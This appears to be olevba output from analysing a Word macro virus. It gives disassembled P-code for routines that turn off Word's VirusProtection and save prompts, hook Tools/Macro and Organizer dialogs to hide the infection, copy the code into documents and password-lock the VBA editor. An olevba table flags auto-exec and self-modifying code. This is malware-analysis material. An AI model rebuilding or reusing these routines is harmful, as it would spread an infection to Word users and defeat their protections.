' 	FuncDefn (Sub FileNew())
' Line #230:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #231:
' 	ArgsCall AnimateCaption 0x0000 
' Line #232:
' 	ArgsCall Copy2Document 0x0000 
' Line #233:
' 	EndIfBlock 
' Line #234:
' 	EndSub 
' Line #235:
' Line #236:
' 	FuncDefn (Sub Stealth())
' Line #237:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #238:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #239:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' Line #240:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #241:
' 	EndWith 
' Line #242:
' 	EndSub 
' Line #243:
' Line #244:
' 	FuncDefn (Sub NoStealth())
' Line #245:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #246:
' 	LitVarSpecial (True)
' 	MemStWith SaveNormalPrompt 
' Line #247:
' 	LitVarSpecial (True)
' 	MemStWith SavePropertiesPrompt 
' Line #248:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' Line #249:
' 	EndWith 
' Line #250:
' 	EndSub 
' Line #251:
' Line #252:
' 	FuncDefn (Sub ToolsOptions())
' Line #253:
' 	ArgsCall InitDialog 0x0000 
' Line #254:
' 	ArgsCall NoStealth 0x0000 
' Line #255:
' 	OnError (Resume Next) 
' Line #256:
' 	Ld ToolsOptionsDlg 
' 	ArgsMemCall Display 0x0000 
' Line #257:
' 	ArgsCall AnimateCaption 0x0000 
' Line #258:
' 	ArgsCall Stealth 0x0000 
' Line #259:
' 	EndSub 
' Line #260:
' Line #261:
' Line #262:
' 	FuncDefn (Sub NoAccess())
' Line #263:
' 	Ld msg 
' 	Ld vbExclamation 
' 	Ld abadacc 
' 	ArgsLd MsgBox 0x0003 
' 	St a 
' Line #264:
' 	ArgsCall AnimateCaption 0x0000 
' Line #265:
' 	EndSub 
' Line #266:
' Line #267:
' 	FuncDefn (Function passDialog() As Boolean)
' Line #268:
' 	Dim 
' 	VarDefn cruel (As String)
' Line #269:
' 	LitVarSpecial (False)
' 	St passDialog 
' Line #270:
' 	Ld ccc 
' 	Ld code 
' 	LitDI2 0x0009 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St cruel 
' Line #271:
' 	Ld pass 
' 	Ld badboy 
' 	ArgsLd InputBox 0x0002 
' 	ArgsLd LCase 0x0001 
' 	Ld cruel 
' 	Eq 
' 	IfBlock 
' Line #272:
' 	LitVarSpecial (True)
' 	St passDialog 
' Line #273:
' 	ElseBlock 
' Line #274:
' 	ArgsCall NoAccess 0x0000 
' Line #275:
' 	EndIfBlock 
' Line #276:
' 	EndFunc 
' Line #277:
' Line #278:
' Line #279:
' 	FuncDefn (Sub ToolsMacro())
' Line #280:
' 	ArgsCall InitDialog 0x0000 
' Line #281:
' 	Ld ToolsMacrosDlg 
' 	ArgsMemCall Display 0x0000 
' Line #282:
' 	ArgsCall AnimateCaption 0x0000 
' Line #283:
' 	EndSub 
' Line #284:
' Line #285:
' Line #286:
' 	FuncDefn (Sub FileTemplates())
' Line #287:
' 	ArgsCall InitDialog 0x0000 
' Line #288:
' 	Ld ToolsTemplatesDlg 
' 	ArgsMemCall Display 0x0000 
' Line #289:
' 	QuoteRem 0x0000 0x0029 "    CustomizationContext = NormalTemplate"
' Line #290:
' 	ArgsCall AnimateCaption 0x0000 
' Line #291:
' 	EndSub 
' Line #292:
' Line #293:
' 	FuncDefn (Sub viewvbcode())
' Line #294:
' 	Ld passDialog 
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #295:
' 	EndSub 
' Line #296:
' Line #297:
' 	FuncDefn (Sub viewcode())
' Line #298:
' 	ArgsCall viewvbcode 0x0000 
' Line #299:
' 	EndSub 
' Line #300:
' Line #301:
' 	FuncDefn (Sub Organizer())
' Line #302:
' 	ArgsCall InitDialog 0x0000 
' Line #303:
' 	Ld OrganizerDlg 
' 	ArgsMemCall Display 0x0000 
' Line #304:
' 	ArgsCall AnimateCaption 0x0000 
' Line #305:
' 	EndSub 
' Line #306:
' Line #307:
' 	FuncDefn (Sub FormatStyle())
' Line #308:
' 	ArgsCall InitDialog 0x0000 
' Line #309:
' 	StartWithExpr 
' 	Ld FormatStyleDlg 
' 	With 
' Line #310:
' 	ArgsMemCallWith Display 0x0000 
' Line #311:
' 	ArgsMemCallWith Execute 0x0000 
' Line #312:
' 	EndWith 
' Line #313:
' 	ArgsCall AnimateCaption 0x0000 
' Line #314:
' 	EndSub 
' Line #315:
' Line #316:
' Line #317:
' 	FuncDefn (Sub ModifyAttr(fileName As String))
' Line #318:
' 	OnError (Resume Next) 
' Line #319:
' 	Ld fileName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbArchive 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld fileName 
' 	Ld vbArchive 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #320:
' 	EndSub 
' Line #321:
' Line #322:
' 	FuncDefn (Sub AnimateCaption())
' Line #323:
' 	OnError (Resume Next) 
' Line #324:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #325:
' 	Ld Animated 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #326:
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	St anIntv 
' Line #327:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #328:
' 	Ld OFC 
' 	St anCap 
' Line #329:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0003 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #330:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #331:
' 	EndSub 
' Line #332:
' Line #333:
' Line #334:
' 	FuncDefn (Sub ScrollCaption())
' Line #335:
' 	Ld Animated 
' 	IfBlock 
' Line #336:
' 	Ld anCap 
' 	Ld anPos 
' 	ArgsLd Right$ 0x0002 
' 	Ld Application 
' 	MemSt Caption 
' Line #337:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld anIntv 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #338:
' 	Ld anPos 
' 	LitDI2 0x0001 
' 	Add 
' 	St anPos 
' Line #339:
' 	EndIfBlock 
' Line #340:
' Line #341:
' 	Ld anPos 
' 	Ld anCap 
' 	FnLen 
' 	Gt 
' 	IfBlock 
' Line #342:
' 	OnError (Resume Next) 
' Line #343:
' 	Ld WordBasic 
' 	ArgsMemCall viewpage 0x0000 
' Line #344:
' Line #345:
' 	LitDI2 0x0000 
' 	St anPos 
' Line #346:
' 	Ld anCap 
' 	Ld OFC 
' 	Eq 
' 	IfBlock 
' Line #347:
' 	Ld Peace 
' 	St anCap 
' Line #348:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #349:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #350:
' 	Ld anCap 
' 	Ld Peace 
' 	Eq 
' 	ElseIfBlock 
' Line #351:
' 	Ld mw 
' 	St anCap 
' Line #352:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0005 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #353:
' 	LitVarSpecial (True)
' 	St Animated 
' Line #354:
' 	Ld anCap 
' 	Ld mw 
' 	Eq 
' 	ElseIfBlock 
' Line #355:
' 	Ld OFC 
' 	St anCap 
' Line #356:
' 	Ld Now 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x04B0 
' 	ArgsLd TimeSerial 0x0003 
' 	Add 
' 	Ld scrollCap 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #357:
' 	LitVarSpecial (False)
' 	St Animated 
' Line #358:
' 	EndIfBlock 
' Line #359:
' 	EndIfBlock 
' Line #360:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

